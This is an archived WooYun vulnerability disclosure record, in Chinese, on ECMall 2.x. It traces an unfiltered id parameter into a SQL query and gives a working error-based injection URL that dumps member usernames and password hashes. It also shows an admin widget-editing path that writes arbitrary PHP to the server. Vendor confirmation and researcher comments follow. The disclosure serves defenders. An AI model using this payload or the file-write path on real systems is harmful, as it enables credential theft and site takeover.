{"id": 7406, "wybug_id": "wooyun-2013-037510", "wybug_title": "ecmall 2.x通杀SQL注入至后台getshell", "wybug_corp": "ShopEx", "wybug_author": "Chora", "wybug_date": "2013-09-18 22:39", "wybug_open_date": "2013-12-17 22:40", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-09-18：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-09-20：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-09-23：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2013-11-14：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-11-24：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-12-04：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-12-17：\t细节向公众公开  简要描述： ecmall 2.x通杀SQL注入至后台getshell 详细说明：  app/buyer_groupbuy.app.php\nfunction exit_group()    {        $id = empty($_GET['id']) ? 0 : $_GET['id']; //没过滤你懂的。        if (!$id)        {            $this->show_warning('no_such_groupbuy');            return false;        }        // 判断是否能退团        if (!$this->_ican($id, ACT)) //跟进        {            $this->show_warning('Hacking Attempt');            return;        }......    }function _ican($id, $act = '')    {......        $group = current($this->_member_mod->getRelatedData('join_groupbuy', $this->visitor->info['user_id'], array(                'conditions' => 'gb.group_id=' . $id, //带入                'order' => 'gb.group_id DESC',                'fields' => 'gb.state,groupbuy_log.order_id'        )));......    }\neccore/model/mode.base.php\nfunction getRelatedData($relation_name, $ids, $find_param = array())    {......        /* 构造查询条件 */        $conditions = $alias . '.' . $relation_info['foreign_key'] . ' ' . db_create_in($ids);   //主键值限定        $conditions .= $relation_info['ext_limit'] ?                            ' AND ' . $this->_getExtLimit($relation_info['ext_limit'], $alias)                            : '';        $conditions .= is_string($find_param['conditions']) ? ' AND ' . $find_param['conditions'] : '';        $find_param['conditions'] = $conditions; //带入...... return $model->find($find_param);//跟进    }    function find($params = array())    {        extract($this->_initFindParams($params));        /* 字段(SELECT FROM) */        $fields = $this->getRealFields($fields);        $fields == '' && $fields = '*';        $tables = $this->table . ' ' . $this->alias;        /* 左联结(LEFT JOIN) */        $join_result = $this->_joinModel($tables, $join);        /* 原来为($join_result || $index_key)，忘了最初的用意，默认加上主键应该是只为了为获得索引的数组服务的，因此只跟索引键是否是主键有关 */        if ($index_key == $this->prikey || (is_array($index_key) && in_array($this->prikey, $index_key)))        {            /* 如果索引键里有主键，则默认在要查询字段后加上主键 */            $fields .= \",{$this->alias}.{$this->prikey}\";        }        /* 条件(WHERE) */        $conditions = $this->_getConditions($conditions, true);        /* 排序(ORDER BY) */        $order && $order = ' ORDER BY ' . $this->getRealFields($order);        /* 分页(LIMIT) */        $limit && $limit = ' LIMIT ' . $limit;        if ($count)        {            $this->_updateLastQueryCount(\"SELECT COUNT(*) as c FROM {$tables}{$conditions}\");        }        /* 完整的SQL */        $sql = \"SELECT {$fields} FROM {$tables}{$conditions}{$order}{$limit}\";        return $index_key ? $this->db->getAllWithIndex($sql, $index_key) :                            $this->db->getAll($sql);//带入查询,结束.    }\nhttp://localhost/ecmall/index.php?app=buyer_groupbuy&act=exit_group&id=1 union select 1 from (select count(*),concat(floor(rand(0)*2),(select concat(user_name,password) from ecm_member limit 0,1))a from information_schema.tables group by a)b后台GETSHELL的话就太多了没细看,因为是后台权限没多少用,只举一列.\nfunction edit()    {        $name = empty($_GET['name']) ? 0 : trim($_GET['name']);        if (!$name)        {            $this->show_warning('no_such_widget');            return;        }        $script_file = $this->_get_file($name, $_GET['file']);        if (!IS_POST)        {            $this->assign('code', file_get_contents($script_file));            $this->display('widget.form.html');        }        else        {            if (!file_put_contents($script_file, stripslashes($_POST['code'])))            {                $this->show_warning('edit_file_failed');                return;            }            $this->show_message('edit_file_successed');        }    }    function _get_file($name, $type = 'script')    {        $file = ROOT_PATH . '/external/widgets/' . $name;        switch ($type)        {            case 'script':                return $file . '/main.widget.php';            break;            case 'template':                return $file . '/widget.html';            break;        }    }\n直接访问http://localhost/ecmall/admin/index.php?app=widget&act=edit&name=advt&file=script修改就行,对应的地址是http://localhost/ecmall/external/widgets/advt/main.widget.php   漏洞证明：  注入的前提是登陆会员，不过默认都开启了注册功能。\n\n\n\n\n\n   修复方案：  潜水很久混个脸熟- -。   版权声明：转载请注明来源 Chora@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：16  确认时间：2013-09-20 11:43 厂商回复： 非常感谢您为shopex信息安全做的贡献我们将尽快修复非常感谢 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-09-18 22:39 |    \t\t小胖子  \t\t\t( 核心白帽子 |\t\t\t        Rank:1727 漏洞数:140        | 如果大海能够带走我的矮丑...)\t\t \n  1w的节奏？    \n     2013-09-18 23:33 |    \t\t爱上平顶山  \t\t\t( 核心白帽子 |\t\t\t        Rank:2738 漏洞数:547        | [不戴帽子]异乡过客.曾就职于天朝某机构.IT...)\t\t \n  @小胖子 目测牛B    \n     2013-09-19 15:25 |    \t\t岩少 \t\t\t( 普通白帽子  |\t\t\t        Rank:586 漏洞数:171        | 破晓团队)\t\t \n  这个程序用的多么?    \n     2013-09-20 11:46 |    \t\tThanos \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:2        | 结界)\t\t \n  目测比当年人寿的要高@小胖子    \n     2013-10-10 12:02 |    \t\t小胖子  \t\t\t( 核心白帽子 |\t\t\t        Rank:1727 漏洞数:140        | 如果大海能够带走我的矮丑...)\t\t \n  牛逼！    \n     2013-10-10 13:23 |    \t\tsaline \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:32        | Focus On Web Secur1ty)\t\t \n  还有洞子的,这套程序虽然是shopex旗下的，但是高危估计也没有1w，500qb的节奏吧！    \n     2013-10-24 14:43 |    \t\t虾米 \t\t\t( 普通白帽子  |\t\t\t        Rank:105 漏洞数:13        )\t\t \n  后台getshell？是编辑挂件那里 ？    \n     2013-11-01 17:24 |    \t\t士大夫 \t\t\t( 实习白帽子  |\t\t\t        Rank:88 漏洞数:37        | 杭州WEB安全小组)\t\t \n  爆出的密码无法破解    \n     2013-11-01 18:31 |    \t\tChora \t\t\t( 普通白帽子  |\t\t\t        Rank:337 漏洞数:22        | 生存、生活、生命。)\t\t \n  @士大夫  WooYun: ecmall2.x修改任意管理员和用户密码    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 16, "Ranks": null}